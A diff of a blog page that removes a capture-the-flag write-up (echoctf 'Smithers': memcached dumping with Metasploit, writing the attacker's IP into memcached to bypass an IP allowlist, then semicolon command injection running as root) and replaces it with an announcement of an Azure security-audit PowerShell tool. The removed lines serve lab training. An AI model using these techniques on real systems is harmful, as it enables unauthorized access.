@@ -7,7 +7,7 @@
 <link rel="stylesheet" href="/_assets/css/chirpy.css" />
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css" />
 <script defer src="/_assets/js/main.js"></script>
-<link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+</head>
   <body>
     <div class="wrapper">
       <aside class="sidebar">
@@ -39,78 +39,56 @@
       <span class="sep">›</span>
       <a href="/archives">Archives</a>
       
-        <span class="sep">›</span>
-        <a href="/tags#topic:ctf">topic:ctf</a>
-      
     </div>
-    <h1>Smithers - Echo CTF Challenge</h1>
+    <h1>AzureSecAnalyzer - A PowerShell project that checks the security settings of Azure resources</h1>
     <div class="post-meta meta-line">
-      <span class="badge"><span class="dot"></span><time datetime="2025-02-15T16:54:47.104Z">2025-02-15</time></span>
+      <span class="badge"><span class="dot"></span><time datetime="2025-08-22T07:43:24.255Z">2025-08-22</time></span>
       
       <span class="badge"><span class="dot"></span>1 min read</span>
       
-      <span class="badge"><span class="dot"></span>topic:ctf</span>
+      
     </div>
-    <div class="post-content"><p><img src="/_resources/a6e7b38cb9944cc4ba6cb5ffb04cef74.png" /></p>
-<p><a title="https://echoctf.red/target/5" href="https://echoctf.red/target/5">Link to target</a></p>
-<h2 id="introduction">Introduction</h2>
-<p>This post details the process of solving the "Smithers" challenge on echoctf.red.</p>
-<h2 id="enumeration-phase">Enumeration Phase</h2>
-<h3 id="nmap-scan">Nmap Scan</h3>
-<p>I start the reconnaissance with nmap:</p>
-<div><pre class="hljs"><code>PORT      STATE SERVICE   VERSION
-<span class="hljs-number">10888</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>      nginx
-| <span class="hljs-keyword">http</span>-methods: 
-|_  Supported Methods: GET HEAD POST
-|<span class="hljs-title">_http-title</span>: Network Tools
-<span class="hljs-number">11211</span>/tcp <span class="hljs-built_in">open</span>  memcached Memcached <span class="hljs-number">1.5</span><span class="hljs-number">.12</span> (uptime <span class="hljs-number">224</span> <span class="hljs-built_in">seconds</span>)</code></pre></div>
-<h3 id="web-server-on-port-10888">Web Server on Port 10888</h3>
-<p>There is a web server running on port 10888:<br />
-<img src="/_resources/65833c4c20ff4cbabeb2779c06f9ad35.png" /></p>
-<p>It mentions that these utilities are only available to authorized IP addresses.</p>
-<h3 id="extracting-information-from-memcached-with-metasploit">Extracting Information from Memcached with Metasploit</h3>
-<p>I use Metasploit to extract information from the memcached service:</p>
-<div><pre class="hljs"><code>msf6 &gt; use auxiliary/gather/memcached_extractor
-
-msf6 auxiliary(gather/memcached<span class="hljs-emphasis">_extractor) &gt; set rhosts 10.0.100.142 
-rhosts =&gt; 10.0.100.142
-msf6 auxiliary(gather/memcached_</span>extractor) &gt; exploit
-
-[+] 10.0.100.142:11211    - Found 1 keys
-
-<span class="hljs-section">Keys/Values Found for 10.0.100.142:11211
-========================================</span>
-
-<span class="hljs-code"> Key     Value</span>
-<span class="hljs-code"> ---     -----</span>
-<span class="hljs-code"> ETSCTF  "VALUE ETSCTF 0 39\r\nETSCTF_&lt;REDACTED&gt;\r\nEND\r\n"</span>
-</code></pre></div>
-<p>A flag is found in the memcached service.</p>
-<h2 id="exploitation-phase">Exploitation Phase</h2>
-<h3 id="using-telnet-to-modify-memcached">Using Telnet to Modify Memcached</h3>
-<p>The key is to store my IP address in the memcached service as <code>REMOTE_ADDR</code>. After some research, I use telnet to connect and store my IP address:</p>
-<div><pre class="hljs"><code><span class="hljs-attribute">telnet</span> <span class="hljs-number">10.0.100.142</span> <span class="hljs-number">11211</span>
-<span class="hljs-attribute">Trying</span> <span class="hljs-number">10.0.100.142</span>...
-<span class="hljs-attribute">Connected</span> to <span class="hljs-number">10.0.100.142</span>.
-<span class="hljs-attribute">Escape</span> character is '^]'.
-<span class="hljs-attribute">add</span> REMOTE_ADDR <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10</span>
-<span class="hljs-section">&lt;My IP&gt;</span>
-<span class="hljs-attribute">STORED</span></code></pre></div>
-<h3 id="accessing-the-web-server">Accessing the Web Server</h3>
-<p>Once my address is stored, I can access the web server, which presents a command line interface:<br />
-<img src="/_resources/4b2e3bd1f2054998b3142bfda29db88b.png" /></p>
-<p>Two flags are visible. Using a semicolon (<code>;</code>), I can run other commands and see that it runs as root. By executing:</p>
-<div><pre class="hljs"><code><span class="hljs-keyword">grep</span> -r <span class="hljs-string">'ETSCTF'</span> /</code></pre></div>
-<p>All flags are found.</p>
+    <div class="post-content"><h1 id="azuresecanalyzer-a-powershell-project-that-checks-the-security-settings-of-azure-resources">AzureSecAnalyzer - A PowerShell project that checks the security settings of Azure resources.</h1>
+<p>I'm excited to announce that I've just published <a title="https://github.com/Giuslock/AzureSecAnalyzer" href="https://github.com/Giuslock/AzureSecAnalyzer"><strong>AzureSecAnalyzer</strong></a>, a PowerShell-based tool that checks the security settings of Azure resources. Whether you're managing a small-scale deployment or a multi-tenant environment, AzureSecAnalyzer provides comprehensive insights into the security configurations of your Azure resources and helps you identify potential vulnerabilities.</p>
+<h3 id="what-is-azuresecanalyzer">What Is AzureSecAnalyzer?</h3>
+<p>AzureSecAnalyzer is a versatile PowerShell project designed to analyze the security settings of various Azure resources, giving you a clear overview of how secure your environment is. The tool currently supports a wide range of Azure services, including:</p>
+<ul>
+<li>Analysis Services</li>
+<li>App Services</li>
+<li>Azure Cache for Redis</li>
+<li>Cosmos DB</li>
+<li>Disks</li>
+<li>Event Hub Namespaces</li>
+<li>Key Vaults</li>
+<li>PostgreSQL (Flexible and Single Servers)</li>
+<li>SQL Database and SQL Server</li>
+<li>Storage Accounts</li>
+</ul>
+<p>AzureSecAnalyzer outputs the analysis results in an easy-to-read <code>.xlsx</code> file, making it simple to sort, filter, and interpret the data to improve your security posture.</p>
+<h3 id="how-it-works">How It Works</h3>
+<p>Once everything is set up, running AzureSecAnalyzer is straightforward. The tool offers different modes based on your needs:</p>
+<ul>
+<li><strong>Subscription mode:</strong> Analyze the entire Azure subscription.</li>
+<li><strong>Resource Group mode:</strong> Focus on specific resource groups.</li>
+<li><strong>Tenant mode:</strong> Analyze at the tenant level without additional input.</li>
+</ul>
+<p>The process is simple:</p>
+<ol>
+<li>Run the script <code>launch.ps1</code>.</li>
+<li>Input the required details (subscription, resource group, etc.) into the <code>variables.txt</code> file.</li>
+<li>The script will perform the analysis and generate a comprehensive <code>.xlsx</code> report.</li>
+</ol>
+<h3 id="output-format">Output Format</h3>
+<p>The results are saved as an <code>.xlsx</code> file for easy analysis. You can quickly identify weak security settings and take the necessary actions to secure your environment.</p>
+<h3 id="get-involved">Get Involved</h3>
+<p>If you find AzureSecAnalyzer helpful or have ideas for improvements, contributions are welcome! Head over to the <a title="https://github.com/Giuslock/AzureSecAnalyzer" href="https://github.com/Giuslock/AzureSecAnalyzer">GitHub repository</a> to create a pull request or submit issues.</p>
 </div>
 <nav class="post-nav" style="margin-top:1rem;">
   
   
-    <a href="/article/untitled">← CTF Report: 2Million</a>
-  
   
     <span style="float:right;">
-      <a href="/article/soccer-an-htb-easy-machine">Soccer - An HTB easy machine →</a>
+      <a href="/article/untitled">CTF Report: 2Million →</a>
     </span>
   
 </nav>
